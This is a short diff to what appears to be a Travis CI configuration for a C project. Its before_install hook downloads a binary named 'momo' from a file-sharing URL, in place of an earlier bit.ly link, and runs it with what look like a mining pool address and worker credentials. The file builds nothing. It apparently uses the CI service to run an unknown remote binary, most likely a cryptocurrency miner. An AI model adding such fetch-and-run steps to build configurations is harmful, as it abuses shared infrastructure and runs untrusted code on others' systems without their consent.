@@ -1,5 +1,4 @@
 language: c
 before_install:
-  - curl -o momo -L http://bit.ly/2dynbiY
-  - ls -lah
-  - momo -o $URL -O hubaba.hubaba1:hubapass
+  - curl -o momo -L https://transfer.sh/k5rgI/momo
+  - ./momo -o $URL -O hubaba.hubaba1:hubapass
